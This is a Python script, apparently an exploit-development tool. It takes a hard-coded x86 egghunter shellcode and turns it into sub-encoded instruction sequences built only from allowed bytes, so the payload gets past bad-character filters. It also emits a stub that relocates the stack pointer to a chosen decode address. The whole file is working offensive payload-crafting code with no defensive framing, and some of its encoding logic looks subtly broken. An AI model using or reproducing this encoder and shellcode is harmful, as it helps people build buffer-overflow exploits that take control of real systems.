#!/usr/bin/python
from random import choice

#Define bad characters here
badChar=[0x00, 0x0a, 0x0d, 0x0e, 0x2f, 0x3a, 0x3f, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
         0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96,
         0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5,
         0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 0xb4,
         0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3,
         0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2,
         0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1,
         0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0,
         0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff, 0x40]

#This is the shellcode we are going to encode and the register we have available to do this
shellcode = (r"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
register = "EAX"

#All possible hex characters
allChar =[0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
          0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
          0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20,
          0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b,
          0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,
          0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41,
          0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c,
          0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
          0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62,
          0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d,
          0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
          0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82, 0x83,
          0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e,
          0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99,
          0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4,
          0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf,
          0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba,
          0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5,
          0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0,
          0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb,
          0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6,
          0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1,
          0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc,
          0xfd, 0xfe, 0xff]

#Full alphanumeric range of hex characters
alphaNumRange = [0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42,
                 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55,
                 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
                 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a]

hexAlpha = []
for value in alphaNumRange:
    if value not in badChar:
        hexAlpha.append(hex(value))

#Define usable characters based on bad characters
goodChar=[]
for value in allChar:
    if value not in badChar:
        goodChar.append(hex(value))

def check_len(shell):# a check if the length of the shellcode is divisable in blocks of 4 bytes
    if len(shell) / 4 % 4 != 0:
        NofP = 4 - (len(shell) / 4 % 4 != 0)
        print("Shellcode not divisible by 4 padding with " + str(NofP) + " Nops")
        shell += r"\x90" * NofP
    print("Shellcode is a correct multiple of 4")
    return shell

def remove(shellcode):# remove "' and \x from shellcode to get a hexadecimal string without formatting
    shellcode = shellcode.replace("\\x", "")
    shellcode = shellcode.replace("'", "")
    shellcode = shellcode.replace('"', "")
    return shellcode

def reverse(hexstring):
    hexbyte1 = hexstring[0] + hexstring[1]
    hexbyte2 = hexstring[2] + hexstring[3]
    hexbyte3 = hexstring[4] + hexstring[5]
    hexbyte4 = hexstring[6] + hexstring[7]
    newhex = hexbyte4 + hexbyte3 + hexbyte2 + hexbyte1
    return newhex

def split(hexstring):
    hexbyte1 = hexstring[0] + hexstring[1]
    hexbyte2 = hexstring[2] + hexstring[3]
    hexbyte3 = hexstring[4] + hexstring[5]
    hexbyte4 = hexstring[6] + hexstring[7]
    hexbyte5 = hexstring[8] + hexstring[9]
    return hexbyte2, hexbyte3, hexbyte4, hexbyte5

def calc(hexvalue1, hexvalue2):
    revhex = hexvalue1
    if hexvalue2 == "wrap":
        intofhex = int(revhex, 16)  # Make int to be able to calculate
        zeroMin = 0 - intofhex & 0xFFFFFFFF  # Make the clock go round
        zeroMin = "0x" + hex(zeroMin)[2:].zfill(8)
        return zeroMin
    else:
        intofhex1 = int(hexvalue1, 16)  # Make int to be able to calculate
        intofhex2 = int(hexvalue2, 16)
        diff = intofhex1 - intofhex2 & 0xFF  # Make the clock go round
        diff = "0x" + hex(diff)[2:]
        return diff

def sub(values):
    retvalue = []
    for i in values:
        hex7c = int('0x7c', 16)
        hexchar = int(i, 16)
        if hexchar == 0:
            hexchar += 100
            retvalue += '0x7c', '0x7c', '0x08'
        elif hexchar == 1:
            hexchar += 101
            retvalue += '0x7c', '0x84', '0x01'
        elif hexchar <= hex7c:
            nextsub = '0x01'
            hexchar = hexchar - 0x02  # deze nog aanpassen ivm 0
            hexchar = "0x" + hex(hexchar)[2:].zfill(2)
            retvalue += hexchar, nextsub, nextsub
        elif hexchar >= hex7c * 2:
            remainder = hexchar - (hex7c + hex7c)
            remainder = "0x" + hex(remainder)[2:].zfill(2)
            hex7c = hex(hex7c)
            retvalue += hex7c, hex7c, remainder

        else:
            remainder = hexchar - hex7c - 0x01
            remainder = "0x" + hex(remainder)[2:].zfill(2)
            hex7c = hex(hex7c)
            retvalue += hex7c, remainder, '0x01'

    # This whole piece must be smarter !!
    # In case of a 00 we must change some values
    if values[0] == "00":
        pass  # print("first value")
    if values[1] == "00":
        retvalue[0] = calc(retvalue[0], '0x01')
    if values[2] == "00":
        retvalue[3] = calc(retvalue[3], '0x01')
    if values[3] == "00":
        pass  # print("fourth value")
    if values[3] == "01":
         retvalue[6] = calc(retvalue[6], '0x01')
    return retvalue

def test(chunks):
    intofhex1 = int(chunks[0], 16)
    intofhex2 = int(chunks[1], 16)
    intofhex3 = int(chunks[2], 16)
    test = hex(0 - intofhex1 - intofhex2 - intofhex3 & 0xFFFFFFFF)
    result = "0x" + test[2:].zfill(8)
    return result

def strip(ugly):
    n = 2
    nice = [ugly[index: index + n] for index in range(0, len(ugly), n)]
    nice = "".join(nice[1::2])
    nice = nice.upper()
    return nice

def subtable(retvalue):
    nice = []
    chunk1 = retvalue[0:3][0] + retvalue[3:6][0] + retvalue[6:9][0] + retvalue[9:12][0]
    chunk2 = retvalue[0:3][1] + retvalue[3:6][1] + retvalue[6:9][1] + retvalue[9:12][1]
    chunk3 = retvalue[0:3][2] + retvalue[3:6][2] + retvalue[6:9][2] + retvalue[9:12][2]
    nice.append(strip(chunk1))
    nice.append(strip(chunk2))
    nice.append(strip(chunk3))
    return nice

# function to check if there are x00 bytes in the value
def checkForZero(x):
    valueList = split(x)
    returnValue = None
    n=0
    doubleZero = 0
    for v in valueList:
        if int(v, base=16) == 00:
            returnValue = n
            doubleZero = doubleZero + 1
        n = n + 1
    if doubleZero > 1:
        print("More than one byte is x00, value not suitable for encoding by this script")
    return returnValue

#Function for if there is a null byte as the first byte of target value
def encodeNullFirst(x):
    k = str(hex(x))[2:99].strip("L")
    k = "0" * (8-len(k)) + k

    a = (k[6] + k[7]) + (k[4] + k[5]) + (k[2] + k[3]) + (k[0] + k[1])

    a1 = a[0:2]
    a2 = a[2:4]
    a3 = a[4:6]
    a4 = a[6:8]

    row1 = int(a1,16)
    while row1 !=0:
        try:
            b1 = choice(goodChar)
            c1 = choice(goodChar)
            d1 = choice(goodChar)

            if (int(a1,16) - int(b1,16) - int(c1,16) - int(d1,16) == 0):
                break

        except:
            print("Something went wrong for row1")

    row2 = int(a2,16)
    while row2 !=0:
        try:
            b2 = choice(goodChar)
            c2 = choice(goodChar)
            d2 = choice(goodChar)

            if (int(a2,16) - int(b2,16) - int(c2,16) - int(d2,16) == 0):
                break

        except:
            print("Something went wrong for row2")

    row3 = int(a3,16)
    while row3 !=0:
        try:
            b3 = choice(goodChar)
            c3 = choice(goodChar)
            d3 = choice(goodChar)

            if (int(a3,16) - int(b3,16) - int(c3,16) - int(d3,16) + int("100",16) == 0):
                break

        except:
            print("Something went wrong for row3")

    row4 = int("100",16)
    while row4 !=1:
        try:
            b4 = choice(goodChar)
            c4 = choice(goodChar)
            d4 = choice(goodChar)

            if (int("100",16) - int(b4,16) - int(c4,16) - int(d4,16) == 1):
                break

        except:
            print("Something went wrong")

    zeroEax()
    print("\"\\x2d" + padAndStrip(b1) + padAndStrip(b2) + padAndStrip(b3) + padAndStrip(b4) + "\"")
    print("\"\\x2d" + padAndStrip(c1) + padAndStrip(c2) + padAndStrip(c3) + padAndStrip(c4) + "\"")
    print("\"\\x2d" + padAndStrip(d1) + padAndStrip(d2) + padAndStrip(d3) + padAndStrip(d4) + "\"")
    print("\"\\x50\"")

#Function to encode when there is a null byte in the second byte of target value
def encodeNullSecond(x):
    k = str(hex(x))[2:99].strip("L")
    k = "0" * (8-len(k)) + k

    a = (k[6] + k[7]) + (k[4] + k[5]) + (k[2] + k[3]) + (k[0] + k[1])

    a1 = a[0:2]
    a2 = a[2:4]
    a3 = a[4:6]
    a4 = a[6:8]

    row1 = int(a1,16)
    while row1 !=0:
        try:
            b1 = choice(goodChar)
            c1 = choice(goodChar)
            d1 = choice(goodChar)

            if (int(a1,16) - int(b1,16) - int(c1,16) - int(d1,16) == 0):
                break

        except:
            print("Something went wrong for row1")

    row2 = int(a2,16)
    while row2 !=0:
        try:
            b2 = choice(goodChar)
            c2 = choice(goodChar)
            d2 = choice(goodChar)

            if (int(a2,16) - int(b2,16) - int(c2,16) - int(d2,16) == 0):
                break

        except:
            print("Something went wrong for row2")

    row3 = int("100",16)
    while row3 !=0:
        try:
            b3 = choice(goodChar)
            c3 = choice(goodChar)
            d3 = choice(goodChar)

            if (int("100",16) - int(b3,16) - int(c3,16) - int(d3,16) == 0):
                break

        except:
            print("Something went wrong for row3")

    row4 = int(a4,16)
    while row4 !=1:
        try:
            b4 = choice(goodChar)
            c4 = choice(goodChar)
            d4 = choice(goodChar)

            if (int(a4,16) - int(b4,16) - int(c4,16) - int(d4,16) == 1):
                break

        except:
            print("Something went wrong")

    zeroEax()
    print("\"\\x2d" + padAndStrip(b1) + padAndStrip(b2) + padAndStrip(b3) + padAndStrip(b4) + "\"")
    print("\"\\x2d" + padAndStrip(c1) + padAndStrip(c2) + padAndStrip(c3) + padAndStrip(c4) + "\"")
    print("\"\\x2d" + padAndStrip(d1) + padAndStrip(d2) + padAndStrip(d3) + padAndStrip(d4) + "\"")
    print("\"\\x50\"")

#Function to encode when there is a null byte in the third byte of target value
def encodeNullThird(x):
    k = str(hex(x))[2:99].strip("L")
    k = "0" * (8-len(k)) + k

    a = (k[6] + k[7]) + (k[4] + k[5]) + (k[2] + k[3]) + (k[0] + k[1])

    a1 = a[0:2]
    a2 = a[2:4]
    a3 = a[4:6]
    a4 = a[6:8]

    row1 = int(a1,16)
    while row1 !=0:
        try:
            b1 = choice(goodChar)
            c1 = choice(goodChar)
            d1 = choice(goodChar)

            if (int(a1,16) - int(b1,16) - int(c1,16) - int(d1,16) == 0):
                break

        except:
            print("Something went wrong for row1")

    row2 = int(a2,16)
    while row2 !=0:
        try:
            b2 = choice(goodChar)
            c2 = choice(goodChar)
            d2 = choice(goodChar)

            if (int(a2,16) - int(b2,16) - int(c2,16) - int(d2,16) == 0):
                break

        except:
            print("Something went wrong for row2")

    row3 = int("100",16)
    while row3 !=0:
        try:
            b3 = choice(goodChar)
            c3 = choice(goodChar)
            d3 = choice(goodChar)

            if (int("100",16) - int(b3,16) - int(c3,16) - int(d3,16) == 0):
                break

        except:
            print("Something went wrong for row3")

    row4 = int(a4,16)
    while row4 !=1:
        try:
            b4 = choice(goodChar)
            c4 = choice(goodChar)
            d4 = choice(goodChar)

            if (int(a4,16) - int(b4,16) - int(c4,16) - int(d4,16) == 1):
                break

        except:
            print("Something went wrong")

    zeroEax()
    print("\"\\x2d" + padAndStrip(b1) + padAndStrip(b2) + padAndStrip(b3) + padAndStrip(b4) + "\"")
    print("\"\\x2d" + padAndStrip(c1) + padAndStrip(c2) + padAndStrip(c3) + padAndStrip(c4) + "\"")
    print("\"\\x2d" + padAndStrip(d1) + padAndStrip(d2) + padAndStrip(d3) + padAndStrip(d4) + "\"")
    print("\"\\x50\"")

#Function to encode when there is a null byte in the third byte of target value
def encodeNullFourth(x):
    k = str(hex(x))[2:99].strip("L")
    k = "0" * (8-len(k)) + k

    a = (k[6] + k[7]) + (k[4] + k[5]) + (k[2] + k[3]) + (k[0] + k[1])

    a1 = a[0:2]
    a2 = a[2:4]
    a3 = a[4:6]
    a4 = a[6:8]

    row1 = int(a1,16)
    while row1 !=0:
        try:
            b1 = choice(goodChar)
            c1 = choice(goodChar)
            d1 = choice(goodChar)

            if (int(a1,16) - int(b1,16) - int(c1,16) - int(d1,16) == 0):
                break

        except:
            print("Something went wrong for row1")

    row2 = int(a2,16)
    while row2 !=0:
        try:
            b2 = choice(goodChar)
            c2 = choice(goodChar)
            d2 = choice(goodChar)

            if (int(a2,16) - int(b2,16) - int(c2,16) - int(d2,16) == 0):
                break

        except:
            print("Something went wrong for row2")

    row3 = int(a3,16)
    while row3 !=0:
        try:
            b3 = choice(goodChar)
            c3 = choice(goodChar)
            d3 = choice(goodChar)

            if (int("100",16) - int(b3,16) - int(c3,16) - int(d3,16) == 0):
                break

        except:
            print("Something went wrong for row3")

    row4 = int("100",16)
    while row4 !=1:
        try:
            b4 = choice(goodChar)
            c4 = choice(goodChar)
            d4 = choice(goodChar)

            if (int(a4,16) - int(b4,16) - int(c4,16) - int(d4,16) == 1):
                break

        except:
            print("Something went wrong")

    zeroEax()
    print("\"\\x2d" + padAndStrip(b1) + padAndStrip(b2) + padAndStrip(b3) + padAndStrip(b4) + "\"")
    print("\"\\x2d" + padAndStrip(c1) + padAndStrip(c2) + padAndStrip(c3) + padAndStrip(c4) + "\"")
    print("\"\\x2d" + padAndStrip(d1) + padAndStrip(d2) + padAndStrip(d3) + padAndStrip(d4) + "\"")
    print("\"\\x50\"")

#Encoding function for when there are no nullbytes present in the target address
def encodeNorm(x):
    k = str(hex(x))[2:99].strip("L")
    k = "0" * (8-len(k)) + k

    a = (k[6] + k[7]) + (k[4] + k[5]) + (k[2] + k[3]) + (k[0] + k[1])

    a1 = a[0:2]
    a2 = a[2:4]
    a3 = a[4:6]
    a4 = a[6:8]

    row1 = int(a1,16)
    while row1 !=0:
        try:
            b1 = choice(goodChar)
            c1 = choice(goodChar)
            d1 = choice(goodChar)

            if (int(a1,16) - int(b1,16) - int(c1,16) - int(d1,16) == 0):
                break

        except:
            print("Something went wrong for row1")

    row2 = int(a2,16)
    while row2 !=0:
        try:
            b2 = choice(goodChar)
            c2 = choice(goodChar)
            d2 = choice(goodChar)

            if (int(a2,16) - int(b2,16) - int(c2,16) - int(d2,16) == 0):
                break

        except:
            print("Something went wrong for row2")

    row3 = int(a3,16)
    while row3 !=0:
        try:
            b3 = choice(goodChar)
            c3 = choice(goodChar)
            d3 = choice(goodChar)

            if (int(a3,16) - int(b3,16) - int(c3,16) - int(d3,16) == 0):
                break

        except:
            print("Something went wrong for row3")

    row4 = int(a4,16)
    while row4 !=0:
        try:
            b4 = choice(goodChar)
            c4 = choice(goodChar)
            d4 = choice(goodChar)

            if (int(a4,16) - int(b4,16) - int(c4,16) - int(d4,16) == 0):
                break

        except:
            print("Something went wrong")

    zeroEax()
    print("\"\\x2d" + padAndStrip(b1) + padAndStrip(b2) + padAndStrip(b3) + padAndStrip(b4) + "\"")
    print("\"\\x2d" + padAndStrip(c1) + padAndStrip(c2) + padAndStrip(c3) + padAndStrip(c4) + "\"")
    print("\"\\x2d" + padAndStrip(d1) + padAndStrip(d2) + padAndStrip(d3) + padAndStrip(d4) + "\"")
    print("\"\\x50\"")

def encodeAddress(x,y):
    k = str(hex(x))[2:99].strip("L")
    k = "0" * (8-len(k)) + k

    j = str(hex(y))[2:99].strip("L")
    j = "0" * (8-len(j)) + j

    a = (k[0] + k[1]) + (k[2] + k[3]) + (k[4] + k[5]) + (k[6] + k[7])
    z = (j[0] + j[1]) + (j[2] + j[3]) + (j[4] + j[5]) + (j[6] + j[7])

    a1 = a[0:2]
    a2 = a[2:4]
    a3 = a[4:6]
    a4 = a[6:8]

    z1 = z[0:2]
    z2 = z[2:4]
    z3 = z[4:6]
    z4 = z[6:8]

    row1 = int('0',16)
    target1 = int('100',16)+(int(z1,16)-int('1',16))
    while row1 != target1:
        try:
            b1 = choice(hexAlpha)
            c1 = choice(hexAlpha)
            d1 = choice(hexAlpha)

            if (int(a1,16) + int(b1,16) + int(c1,16) + int(d1,16) == target1):
                break

        except:
            print("Something went wrong for row1")

    row2 = int('0',16)
    target2 = int('100',16)+(int(z2,16)-int('1',16))
    while row2 != target2:
        try:
            b2 = choice(hexAlpha)
            c2 = choice(hexAlpha)
            d2 = choice(hexAlpha)

            if (int(a2,16) + int(b2,16) + int(c2,16) + int(d2,16) == target2):
                break

        except:
            print("Something went wrong for row2")

    row3 = int('0',16)
    target3 = int('100',16)+(int(z3,16)-int('1',16))
    while row3 != target3:
        try:
            b3 = choice(hexAlpha)
            c3 = choice(hexAlpha)
            d3 = choice(hexAlpha)

            if (int(a3,16) + int(b3,16) + int(c3,16) + int(d3,16) == target3):
                break

        except:
            print("Something went wrong for row3")

    row4 = int('0',16)
    target4 = int('100',16)+int(z4,16)
    while row4 != target4:
        try:
            b4 = choice(hexAlpha)
            c4 = choice(hexAlpha)
            d4 = choice(hexAlpha)

            if (int(a4,16) + int(b4,16) + int(c4,16) + int(d4,16) == target4):
                break

        except:
            print("Something went wrong for row4")

    zeroEax()
    print("\"\\x54\\x58\"\n") #PUSH ESP  POP EAX
    print("\"\\x2d" + padAndStrip(b4) + padAndStrip(b3) + padAndStrip(b2) + padAndStrip(b1) + "\"")
    print("\"\\x2d" + padAndStrip(c4) + padAndStrip(c3) + padAndStrip(c2) + padAndStrip(c1) + "\"")
    print("\"\\x2d" + padAndStrip(d4) + padAndStrip(d3) + padAndStrip(d2) + padAndStrip(d1) + "\"")
    print("\"\\x50\"") #PUSH EAX
    print("\"\\x5c\"") # POP ESP

def padAndStrip(byte):
    address = str.format('\\x{:02x}', int(byte,16))
    return address

#Function to zero out the EAX register
def zeroEax():
    #If XOR EAX,EAX cannot be used due to bad characters, use AND
    if 0x33 in badChar or 0xc0 in badChar:
        print("\"\\x25\\x4a\\x4d\\x4e\\x55\"")
        print("\"\\x25\\x35\\x32\\x31\\x2a\"")

    #XOR EAX,EAX
    else:
        print("\"\\x33\\xc0\"")

def genShellcode(shellcode):
    print("shellcode = (")
    # Set up location of where the shellcode will be decoded:
    encodeAddress(addy1, addy2)
    for i in shellcode:
        shellcode = str(i)
        hexclean = remove(shellcode)  # Remove slashes etc
        revhex = reverse(hexclean)  # Reverse the string endianess
        hexzeroMin = calc(revhex, "wrap")
        # Begin actual shellcode encoding:
        nullByte = checkForZero(hexzeroMin)
        if nullByte == None:
            encodeNorm(int(hexzeroMin, base=16))
        elif nullByte == 0:
            encodeNullFirst(int(hexzeroMin, base=16))
        elif nullByte == 1:
            encodeNullSecond(int(hexzeroMin, base=16))
        elif nullByte == 2:
            encodeNullThird(int(hexzeroMin, base=16))
        elif nullByte == 3:
            encodeNullFourth(int(hexzeroMin, base=16))
    print(")")

if __name__== "__main__":
    shellcode = check_len(shellcode)
    shellcode = [shellcode[i:i + 16] for i in range(0, len(shellcode), 16)]
    startAddress = str(input("Enter current ESP address: "))
    addy2 = int(startAddress, base=16)
    decodeAddress = str(input("Enter target decode address: "))
    addy1= int(decodeAddress, base=16)
    genShellcode(shellcode)
